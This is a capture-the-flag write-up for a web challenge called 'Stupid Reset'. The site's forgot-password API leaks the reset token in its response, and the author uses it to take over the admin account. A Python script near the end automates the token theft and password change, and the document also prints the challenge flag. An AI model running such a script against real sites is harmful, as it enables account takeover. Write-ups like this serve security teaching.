#### Stupid Reset 
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/e95dcf7d-0971-4598-95d0-54f2782a18d2)

Going over to the url shows this
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/f54d7399-f0b2-4aa3-8016-99e314e4c8fb)

There's a sign in and also a register function

I registered an account
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/a9a52481-247d-411c-b2a4-6bb26575e10b)

Here's the request made when we register
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/3fed8acd-f29f-4390-a362-55f52d8c37c6)

Now I can login
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/b49a67d9-a90c-4394-a4f1-931daa321e42)

It redirects to `/dashboard` and shows this
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/e1cfcf35-13be-453a-9200-b210d8df0848)

The page source shows this
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/6bf751de-1063-4902-822b-2140ccce884d)

That's the js file used by the web server 

Back on the sign in page there's a forgot password function
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/db5b797f-2f23-4c98-acc1-3d174f74ed19)

Clicking it shows this
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/625bc51c-0de6-44c3-8374-794eb0483cbd)

When I gave in my user created mail `root@sec.io` and also intercepted the request I got this
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/0ca0c99c-2c1b-40d6-8401-051f29ff2e2a)
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/ea62ee2c-47ae-4670-825d-c243f89566b6)
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/a56df470-b8e0-4c4a-b07a-9a76f168e8c6)

We can see that during the process of the forgot password function, it leaks the token in the response in the json body

How do we take advantage of this since the pop up already said `the reset instruction has been sent to your email address. Kindly click the link within the mail body to initiate the password reset.`

Well I looked back to the `user.js` and saw this endpoint

```js
const resetPassword = () => {
  let current_loc = window.location.href.split("/").pop();
  const data = {
    user: {
      password: document.getElementById("password").value,
    },
  };
  const options = {
    method: "POST",
    headers: {
      "Content-Type": "application/json",
    },
    body: JSON.stringify(data),
  };
  fetch(`/api/reset/${current_loc}`, options)
    .then((data) => {
      return data.json();
    })
    .then((response) => {
      window.alert(response.message);
      window.location.href = "/sign-in";
    })
    .catch((e) => {
      window.alert(JSON.stringify(e));
    });
```

Accessing it shows this
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/cf5434e6-10e3-4025-98e6-b140180d977b)

Looking at it shows that it requires a valid token to be passed in from the url therefore giving us the opportunity to do a password reset

I used the forgot password function to get a token for the user I created `root@sec.io` and did this
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/be0578da-508c-44bc-ac11-73cab2812a2f)
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/909d6b19-8892-4356-b75c-8341b6c64ebf)

I changed the password to `pwned` and when I logged in it worked
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/3a1586fa-d73f-43d3-bf9d-3355b446d320)
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/f01902e2-9b8e-41e9-bad0-b9d2fd30ce9d)

This means we can basically reset any user password cool right?

At this point I looked at the main page then got a user which looked worth it
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/dacc3082-1544-4c39-abfe-19b19908bc9e)

Let us reset user `admin@stupid-reset.com` password

First I got the token
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/142b4298-0e63-4495-8661-4cc982194008)
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/9bd96c60-8c03-4753-9984-fd2060245c11)

Now I use the `/reset` endpoint and change the password to `pwned`
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/60cc0164-314d-4377-9f32-67dc41b550de)
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/32512c95-3b4f-4318-a240-c3c4c0ed69ab)

With this set we should be able to login with `admin@stupid-reset.com:pwned` and get the flag
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/2206d454-e300-47e6-9e0f-4ac322038fdf)
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/696e6454-5729-40c6-b4e4-8986262a6add)

Doing this manually is pain so I made a [script](https://github.com/markuched13/markuched13.github.io/blob/main/solvescript/csean/web/stupid_reset/reset.py) to automate the stress for us 

```python
#!/usr/bin/python3
import requests
import json

email = "admin@stupid-reset.com"
# email = "pwner@root.io"
password = "pwned"
proxy = {"http":"http://127.0.0.1:8080"}

# Step 1: Forget password to get the token
url = 'http://143.198.98.92:1337/api/forgot-password'
param = {'user':{'email':email}}
data = json.dumps(param)
headers = {"Content-Type":"application/json"}
res = requests.post(url, data=data, headers=headers)
val = json.loads(res.text)
reset_token = val['resettoken']

# Step 2: Reset the user accout password
change_to = "pwned"
param = {"user":{"password":change_to}}
data = json.dumps(param)
headers = {"Content-Type":"application/json"}
url = f'http://143.198.98.92:1337/api/reset/{reset_token}'
res = requests.post(url, data=data, headers=headers)

# Print success message
print(f'[*] Email: {email} password has been updated to "{change_to}"')
```

Running it also works then we can login with the password and get the flag
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/0cc2799c-3049-41a0-b252-7812f0f44d9b)

```
Flag: csean-ctf{th!s_RESET_1s_SECURE_you_should_REALly_TrusT_m3!}
```
